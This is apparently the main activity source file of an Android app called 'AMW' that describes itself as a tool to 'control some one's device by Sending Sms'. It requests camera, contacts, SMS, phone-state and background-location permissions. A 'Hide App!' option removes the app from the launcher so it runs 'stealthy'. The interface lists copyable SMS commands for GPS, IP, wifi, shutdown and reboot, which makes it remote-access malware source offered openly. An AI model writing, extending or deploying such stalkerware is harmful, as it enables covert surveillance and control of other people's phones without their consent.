package com.android.amw.mwb;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.AlertDialog;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;

import android.support.annotation.RequiresApi;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.ActionBar;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.TextView;
import android.widget.Toast;

import static android.Manifest.permission.CAMERA;
import static android.Manifest.permission.READ_CONTACTS;
import static android.Manifest.permission.READ_PHONE_STATE;
import static android.Manifest.permission.READ_SMS;
import static android.Manifest.permission.RECEIVE_SMS;
import static android.Manifest.permission.ACCESS_FINE_LOCATION;
import static android.Manifest.permission.ACCESS_BACKGROUND_LOCATION;
import static android.Manifest.permission.SEND_SMS;


public class MainActivity extends AppCompatActivity {

    public static final int RequestPermissionCode = 1;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        ActionBar actionBar = getSupportActionBar();
        if (actionBar != null) {
            actionBar.setTitle("AMW");
        }
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.androidmw_toolbar, menu);
        return true;
    }

    @RequiresApi(api = 29)
    @SuppressLint("NonConstantResourceId")
    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        switch (item.getItemId()) {
            case R.id.permission:
                if (checkPermission()) {
                    AlertDialog.Builder PermissionDialogBuilder = new AlertDialog.Builder(MainActivity.this);
                    PermissionDialogBuilder.setMessage("Permission Granted!");
                    AlertDialog PermissionDialog = PermissionDialogBuilder.create();
                    PermissionDialog.show();
                } else {
                    requestPermission();

                }
                return true;
            case R.id.tutorial:

                    AlertDialog.Builder TutorialDialogBuilder = new AlertDialog.Builder(MainActivity.this);
                TutorialDialogBuilder.setMessage("Send the command to the device number in order to execute command");
                    AlertDialog TutorialDialog = TutorialDialogBuilder.create();
                TutorialDialog.show();

                return true;
            case R.id.about:

                AlertDialog.Builder AboutDialogBuilder = new AlertDialog.Builder(MainActivity.this);
                AboutDialogBuilder.setMessage("Control some one's device by Sending Sms");
                AlertDialog AboutDialog = AboutDialogBuilder.create();
                AboutDialog.show();

                return true;


            case R.id.hide:


                AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(this);
                alertDialogBuilder.setTitle("PLEASE NOTE");
                alertDialogBuilder.setMessage("Application may not be seen on launcher. its stealthy!");
                alertDialogBuilder.setPositiveButton("Hide App!",
                        new DialogInterface.OnClickListener() {
                            @Override
                            public void onClick(DialogInterface arg0, int arg1) {


                                PackageManager p2 = getPackageManager();
                                ComponentName componentName2 = new ComponentName(MainActivity.this, MainActivity.class);
                                p2.setComponentEnabledSetting(componentName2, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);


                            }
                        }).setNegativeButton("Not today!", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        finish();
                    }
                });

                AlertDialog alertDialog = alertDialogBuilder.create();
                alertDialog.show();


            return true;
            case R.id.github:
                startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://github.com/Awengggggggg")));
                return true;
            default:
                return super.onOptionsItemSelected(item);
        }
    }

    @RequiresApi(api = 29)
    private void requestPermission() {

        ActivityCompat.requestPermissions(MainActivity.this, new String[]
                {
                        CAMERA,
                        READ_CONTACTS,
                        READ_PHONE_STATE,
                        READ_SMS,
                        RECEIVE_SMS,
                        SEND_SMS,
                        ACCESS_FINE_LOCATION,
                        ACCESS_BACKGROUND_LOCATION
                }, RequestPermissionCode);

    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
        switch (requestCode) {

            case RequestPermissionCode:

                if (grantResults.length > 0) {

                    boolean CameraPermission = grantResults[0] == PackageManager.PERMISSION_GRANTED;
                    boolean SendSmsPermission = grantResults[1] == PackageManager.PERMISSION_GRANTED;
                    boolean ReadPhoneStatePermission = grantResults[2] == PackageManager.PERMISSION_GRANTED;
                    boolean ReadSMSPermission = grantResults[3] == PackageManager.PERMISSION_GRANTED;
                    boolean RecieveSMSPermission = grantResults[4] == PackageManager.PERMISSION_GRANTED;
                    boolean SendSMSPermission = grantResults[5] == PackageManager.PERMISSION_GRANTED;
                    boolean AcessLocationPermission = grantResults[6] == PackageManager.PERMISSION_GRANTED;
                    boolean AcessPreciseLocationPermission = grantResults[7] == PackageManager.PERMISSION_GRANTED;

                    if (CameraPermission
                            && SendSmsPermission
                            && ReadPhoneStatePermission
                            && ReadSMSPermission
                            && RecieveSMSPermission
                            && SendSMSPermission
                            && AcessLocationPermission
                            && AcessPreciseLocationPermission) {

                        AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(MainActivity.this);
                        alertDialogBuilder.setMessage("Permission Granted!");
                        AlertDialog alertDialog = alertDialogBuilder.create();
                        alertDialog.show();
                    } else {
                        AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(MainActivity.this);
                        alertDialogBuilder.setMessage("Some Permission Denied application may not work properly, \nPlease enable it at Settings!");
                        AlertDialog alertDialog = alertDialogBuilder.create();
                        alertDialog.show();
                    }
                }

                break;
        }
    }

    public boolean checkPermission() {
        int FirstPermissionResult = ContextCompat.checkSelfPermission(getApplicationContext(), CAMERA);
        int SecondPermissionResult = ContextCompat.checkSelfPermission(getApplicationContext(), SEND_SMS);
        int ThirdPermissionResult = ContextCompat.checkSelfPermission(getApplicationContext(), READ_PHONE_STATE);
        int FourthPermissionResult = ContextCompat.checkSelfPermission(getApplicationContext(), READ_SMS);
        int FivePermissionResult = ContextCompat.checkSelfPermission(getApplicationContext(), RECEIVE_SMS);
        int SixPermissionResult = ContextCompat.checkSelfPermission(getApplicationContext(), ACCESS_FINE_LOCATION);
        int SevenPermissionResult = ContextCompat.checkSelfPermission(getApplicationContext(), ACCESS_BACKGROUND_LOCATION);

        return FirstPermissionResult == PackageManager.PERMISSION_GRANTED &&
                SecondPermissionResult == PackageManager.PERMISSION_GRANTED &&
                ThirdPermissionResult == PackageManager.PERMISSION_GRANTED &&
                FourthPermissionResult == PackageManager.PERMISSION_GRANTED &&
                FivePermissionResult == PackageManager.PERMISSION_GRANTED &&
                SixPermissionResult == PackageManager.PERMISSION_GRANTED &&
                SevenPermissionResult == PackageManager.PERMISSION_GRANTED;
    }
    public void ContentOnClick(View v) {

        TextView silent = (TextView) findViewById(R.id.s);
        TextView normal = (TextView) findViewById(R.id.n);
        TextView wifion = (TextView) findViewById(R.id.w1);
        TextView wifioff = (TextView) findViewById(R.id.w2);
        TextView blueon = (TextView) findViewById(R.id.b1);
        TextView blueoff = (TextView) findViewById(R.id.b2);
        TextView flashon = (TextView) findViewById(R.id.f1);
        TextView flashoff = (TextView) findViewById(R.id.f2);
        TextView wifiname = (TextView) findViewById(R.id.wn);
        TextView gps = (TextView) findViewById(R.id.g);
        TextView ip = (TextView) findViewById(R.id.ip);
        TextView toast = (TextView) findViewById(R.id.t);
        TextView notification = (TextView) findViewById(R.id.no);
        TextView sms = (TextView) findViewById(R.id.sm);
        TextView sound = (TextView) findViewById(R.id.so);
        TextView layout = (TextView) findViewById(R.id.l);
        TextView vlayout = (TextView) findViewById(R.id.vl);
        TextView wallpaper = (TextView) findViewById(R.id.w);
        TextView shutdown = (TextView) findViewById(R.id.sh);
        TextView reboot = (TextView) findViewById(R.id.r);

        if (v.getId() == R.id.s) {

            ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            ClipData clip = ClipData.newPlainText("data", silent.getText().toString());
            clipboard.setPrimaryClip(clip);
            Toast.makeText(this, "Silent cmd copied!", Toast.LENGTH_SHORT).show();
        }
        else if (v.getId() == R.id.n) {

            ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            ClipData clip = ClipData.newPlainText("data", normal.getText().toString());
            clipboard.setPrimaryClip(clip);
            Toast.makeText(this, "Normal cmd copied!", Toast.LENGTH_SHORT).show();

        }
        else if (v.getId() == R.id.w1) {

            ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            ClipData clip = ClipData.newPlainText("data", wifion.getText().toString());
            clipboard.setPrimaryClip(clip);
            Toast.makeText(this, "Wifi On cmd copied!", Toast.LENGTH_SHORT).show();
        } else if (v.getId() == R.id.w2) {

            ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            ClipData clip = ClipData.newPlainText("data", wifioff.getText().toString());
            clipboard.setPrimaryClip(clip);
            Toast.makeText(this, "Wifi Off cmd copied!", Toast.LENGTH_SHORT).show();

        }
        else if (v.getId() == R.id.b1){
            ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            ClipData clip = ClipData.newPlainText("data", blueon.getText().toString());
            clipboard.setPrimaryClip(clip);
            Toast.makeText(this, "Bluetooth On cmd copied!", Toast.LENGTH_SHORT).show();
        }
        else if (v.getId() == R.id.b2){
            ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            ClipData clip = ClipData.newPlainText("data", blueoff.getText().toString());
            clipboard.setPrimaryClip(clip);
            Toast.makeText(this, "Bluetooth Off cmd copied!", Toast.LENGTH_SHORT).show();
        }
        else if (v.getId() == R.id.f1){
            ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            ClipData clip = ClipData.newPlainText("data", flashon.getText().toString());
            clipboard.setPrimaryClip(clip);
            Toast.makeText(this, "Flash On cmd copied!", Toast.LENGTH_SHORT).show();
        }
        else if (v.getId() == R.id.f2){
            ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            ClipData clip = ClipData.newPlainText("data", flashoff.getText().toString());
            clipboard.setPrimaryClip(clip);
            Toast.makeText(this, "Flash Off cmd copied!", Toast.LENGTH_SHORT).show();
        } else if (v.getId() == R.id.wn){
            ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            ClipData clip = ClipData.newPlainText("data", wifiname.getText().toString());
            clipboard.setPrimaryClip(clip);
            Toast.makeText(this, "Wifiname cmd copied!", Toast.LENGTH_SHORT).show();

           } else if (v.getId() == R.id.g){
            ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            ClipData clip = ClipData.newPlainText("data", gps.getText().toString());
            clipboard.setPrimaryClip(clip);
            Toast.makeText(this, "Gps cmd copied!", Toast.LENGTH_SHORT).show();
        }
        else if (v.getId() == R.id.ip){
            ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            ClipData clip = ClipData.newPlainText("data", ip.getText().toString());
            clipboard.setPrimaryClip(clip);
            Toast.makeText(this, "Ip cmd copied!", Toast.LENGTH_SHORT).show();
        } else if (v.getId() == R.id.t){
            ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            ClipData clip = ClipData.newPlainText("data", toast.getText().toString());
            clipboard.setPrimaryClip(clip);
            Toast.makeText(this, "Toast cmd copied!", Toast.LENGTH_SHORT).show();
        }
        else if (v.getId() == R.id.no){
            ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            ClipData clip = ClipData.newPlainText("data", notification.getText().toString());
            clipboard.setPrimaryClip(clip);
            Toast.makeText(this, "Notification cmd copied!", Toast.LENGTH_SHORT).show();
        } else if (v.getId() == R.id.sm){
            ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            ClipData clip = ClipData.newPlainText("data", sms.getText().toString());
            clipboard.setPrimaryClip(clip);
            Toast.makeText(this, "Sms cmd copied!", Toast.LENGTH_SHORT).show();
        }
        else if (v.getId() == R.id.so){
            ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            ClipData clip = ClipData.newPlainText("data", sound.getText().toString());
            clipboard.setPrimaryClip(clip);
            Toast.makeText(this, "Sound cmd copied!", Toast.LENGTH_SHORT).show();
        } else if (v.getId() == R.id.l){
            ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            ClipData clip = ClipData.newPlainText("data", layout.getText().toString());
            clipboard.setPrimaryClip(clip);
            Toast.makeText(this, "Layout cmd copied!", Toast.LENGTH_SHORT).show();
        }
        else if (v.getId() == R.id.vl){
            ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            ClipData clip = ClipData.newPlainText("data", vlayout.getText().toString());
            clipboard.setPrimaryClip(clip);
            Toast.makeText(this, "Video layout cmd copied!", Toast.LENGTH_SHORT).show();
        }
        else if (v.getId() == R.id.w){
            ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            ClipData clip = ClipData.newPlainText("data", wallpaper.getText().toString());
            clipboard.setPrimaryClip(clip);
            Toast.makeText(this, "Wallpaper cmd copied!", Toast.LENGTH_SHORT).show();
        } else if (v.getId() == R.id.sh){
            ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            ClipData clip = ClipData.newPlainText("data", shutdown.getText().toString());
            clipboard.setPrimaryClip(clip);
            Toast.makeText(this, "Shutdown cmd copied!", Toast.LENGTH_SHORT).show();
        }
        else if (v.getId() == R.id.r){
            ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            ClipData clip = ClipData.newPlainText("data", reboot.getText().toString());
            clipboard.setPrimaryClip(clip);
            Toast.makeText(this, "Reboot cmd copied!", Toast.LENGTH_SHORT).show();
        }
    }

}

